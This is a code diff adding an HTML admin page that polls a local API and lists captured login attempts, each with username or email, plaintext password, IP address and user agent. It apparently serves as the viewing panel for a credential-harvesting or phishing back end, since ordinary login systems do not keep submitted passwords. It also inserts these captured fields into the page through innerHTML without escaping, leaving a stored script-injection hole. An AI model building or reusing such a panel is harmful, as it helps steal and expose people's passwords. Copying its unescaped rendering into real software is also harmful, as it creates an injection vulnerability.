@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Attempts Admin Panel</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+            background-color: #f5f5f5;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #333;
+            text-align: center;
+        }
+        .stats {
+            display: flex;
+            justify-content: space-around;
+            margin: 20px 0;
+        }
+        .stat-card {
+            background: #007bff;
+            color: white;
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center;
+            min-width: 150px;
+        }
+        .stat-card h3 {
+            margin: 0;
+            font-size: 2em;
+        }
+        .stat-card p {
+            margin: 5px 0 0 0;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+        th, td {
+            padding: 12px;
+            text-align: left;
+            border-bottom: 1px solid #ddd;
+        }
+        th {
+            background-color: #f8f9fa;
+            font-weight: bold;
+        }
+        tr:hover {
+            background-color: #f5f5f5;
+        }
+        .refresh-btn {
+            background: #28a745;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-bottom: 20px;
+        }
+        .refresh-btn:hover {
+            background: #218838;
+        }
+        .ip-address {
+            font-family: monospace;
+            background: #e9ecef;
+            padding: 2px 6px;
+            border-radius: 3px;
+        }
+        .password {
+            font-family: monospace;
+            background: #fff3cd;
+            padding: 2px 6px;
+            border-radius: 3px;
+            border: 1px solid #ffeaa7;
+        }
+        .loading {
+            text-align: center;
+            padding: 20px;
+            color: #666;
+        }
+        .server-info {
+            background: #d4edda;
+            border: 1px solid #c3e6cb;
+            border-radius: 5px;
+            padding: 10px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔐 Login Attempts Monitor</h1>
+        
+        <div class="server-info">
+            <strong>📡 Server Status:</strong> <span id="serverStatus">Checking...</span><br>
+            <strong>🌐 API Endpoint:</strong> <span id="apiEndpoint">http://localhost:3000/api/login-attempts</span>
+        </div>
+        
+        <div class="stats">
+            <div class="stat-card">
+                <h3 id="totalAttempts">-</h3>
+                <p>Total Attempts</p>
+            </div>
+            <div class="stat-card">
+                <h3 id="uniqueIPs">-</h3>
+                <p>Unique IPs</p>
+            </div>
+            <div class="stat-card">
+                <h3 id="todayAttempts">-</h3>
+                <p>Today's Attempts</p>
+            </div>
+        </div>
+
+        <button class="refresh-btn" onclick="loadAttempts()">🔄 Refresh Data</button>
+
+        <div id="loading" class="loading">Loading login attempts...</div>
+        
+        <table id="attemptsTable" style="display: none;">
+            <thead>
+                <tr>
+                    <th>ID</th>
+                    <th>Email/Username</th>
+                    <th>Password</th>
+                    <th>IP Address</th>
+                    <th>User Agent</th>
+                    <th>Timestamp</th>
+                </tr>
+            </thead>
+            <tbody id="attemptsBody">
+            </tbody>
+        </table>
+    </div>
+
+    <script>
+        // Detect current server port
+        const currentPort = window.location.port || '3000';
+        const apiBase = `http://localhost:${currentPort}`;
+        document.getElementById('apiEndpoint').textContent = `${apiBase}/api/login-attempts`;
+
+        async function checkServerStatus() {
+            try {
+                const response = await fetch(`${apiBase}/api/health`);
+                if (response.ok) {
+                    document.getElementById('serverStatus').innerHTML = '<span style="color: green;">✅ Online</span>';
+                } else {
+                    document.getElementById('serverStatus').innerHTML = '<span style="color: red;">❌ Server Error</span>';
+                }
+            } catch (error) {
+                document.getElementById('serverStatus').innerHTML = '<span style="color: red;">❌ Offline</span>';
+            }
+        }
+
+        async function loadAttempts() {
+            const loading = document.getElementById('loading');
+            const table = document.getElementById('attemptsTable');
+            const tbody = document.getElementById('attemptsBody');
+            
+            loading.style.display = 'block';
+            table.style.display = 'none';
+            
+            try {
+                const response = await fetch(`${apiBase}/api/login-attempts`);
+                const data = await response.json();
+                
+                if (data.success) {
+                    // Update stats
+                    const attempts = data.attempts;
+                    document.getElementById('totalAttempts').textContent = attempts.length;
+                    
+                    const uniqueIPs = new Set(attempts.map(a => a.ip_address)).size;
+                    document.getElementById('uniqueIPs').textContent = uniqueIPs;
+                    
+                    const today = new Date().toDateString();
+                    const todayAttempts = attempts.filter(a => 
+                        new Date(a.created_at).toDateString() === today
+                    ).length;
+                    document.getElementById('todayAttempts').textContent = todayAttempts;
+                    
+                    // Clear existing rows
+                    tbody.innerHTML = '';
+                    
+                    // Add new rows
+                    attempts.forEach(attempt => {
+                        const row = document.createElement('tr');
+                        row.innerHTML = `
+                            <td>${attempt.id}</td>
+                            <td><strong>${attempt.email_or_username}</strong></td>
+                            <td><span class="password">${attempt.password}</span></td>
+                            <td><span class="ip-address">${attempt.ip_address || 'Unknown'}</span></td>
+                            <td style="max-width: 300px; overflow: hidden; text-overflow: ellipsis;">${attempt.user_agent || 'Unknown'}</td>
+                            <td>${new Date(attempt.created_at).toLocaleString()}</td>
+                        `;
+                        tbody.appendChild(row);
+                    });
+                    
+                    loading.style.display = 'none';
+                    table.style.display = 'table';
+                } else {
+                    throw new Error(data.message);
+                }
+            } catch (error) {
+                console.error('Error loading attempts:', error);
+                loading.innerHTML = `<p style="color: red;">Error loading data: ${error.message}</p>`;
+            }
+        }
+
+        // Load data when page loads
+        document.addEventListener('DOMContentLoaded', () => {
+            checkServerStatus();
+            loadAttempts();
+        });
+        
+        // Auto-refresh every 30 seconds
+        setInterval(() => {
+            checkServerStatus();
+            loadAttempts();
+        }, 30000);
+    </script>
+</body>
+</html>
